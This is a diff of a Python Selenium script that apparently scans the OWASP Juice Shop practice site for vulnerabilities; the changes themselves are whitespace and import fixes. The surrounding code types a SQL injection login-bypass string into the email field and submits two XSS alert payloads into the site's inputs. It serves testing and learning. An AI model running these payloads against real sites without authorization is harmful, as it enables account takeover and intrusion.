@@ -1,22 +1,22 @@
 from time import sleep
 from random import uniform
-from soup_methods import find_links, find_buttons, find_inputs
+from .soup_methods import find_links, find_buttons, find_inputs
 from bs4 import BeautifulSoup
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.by import By
 
-#Find available links 
+#Find available links
 def available_links(driver,site,queue,available):
     #Get domain
     domain = site.split('.')[0]
     #Visit home
     driver.get(site)
     #While there are available links
-    while len(queue) != 0 : 
+    while len(queue) != 0 :
         #Get first link
-        link = queue[0] 
+        link = queue[0]
         #Visit first link
         driver.get(f'{site}{link}')
         sleep(uniform(1.3,1.7))
@@ -59,20 +59,20 @@ def loginsqlinjection(site,link,driver): #check for sql injection
     sleep(2)
    # driver.find_element_by_xpath('/html/body/div[3]/div[2]/div/mat-dialog-container/app-welcome-banner/div/button[2]/span/span').click() #find login button
     driver.find_element_by_xpath('//*[@id="email"]').send_keys(" ' or 1=1 -- ")
-    password=driver.find_element_by_xpath('//*[@id="password"]') 
+    password=driver.find_element_by_xpath('//*[@id="password"]')
     text='sqlinjection'
     for characters in text:
         password.send_keys(characters)
-        sleep(0.3) #set username and password 
-    driver.find_element_by_xpath('//*[@id="loginButton"]').click() 
+        sleep(0.3) #set username and password
+    driver.find_element_by_xpath('//*[@id="loginButton"]').click()
     sleep(5)
-    if driver.current_url=='https://juice-shop.herokuapp.com/#/search': #check if login failed 
+    if driver.current_url=='https://juice-shop.herokuapp.com/#/search': #check if login failed
           print("your page is vulnerable to sql injection")
     else:
         print("login failed")
 
 def xssattack(driver,site,links):
-    #Checking for 
+    #Checking for
     attacks = ['<script>alert("1")</script>','<iframe src="javascript:alert(`1`)">']
     print('\nChecking for successful XSS attacks')
     flag = False
@@ -87,7 +87,7 @@ def xssattack(driver,site,links):
         try:
             #If many inputs
             if isinstance(inp,list):
-                #Find the class of the first 
+                #Find the class of the first
                 attribute = inp['class'][0]
             else:
                 attribute = inp['class']
@@ -98,7 +98,7 @@ def xssattack(driver,site,links):
             input_found = True
         except:
             pass
-        
+
         try:
             #Check if its a list
             if isinstance(inp,list):
@@ -112,7 +112,7 @@ def xssattack(driver,site,links):
             input_found = True
         except:
             pass
-        
+
         try:
             #Find an element containing search.Probably search input
             input_form = driver.find_elements_by_xpath("//*[contains(text(), 'search')]")
@@ -169,6 +169,6 @@ def xssattack(driver,site,links):
                     return True
         else:
             #If no input was discovered, go to next available link
-            continue 
+            continue
     #Return None if nothing was found
     return None
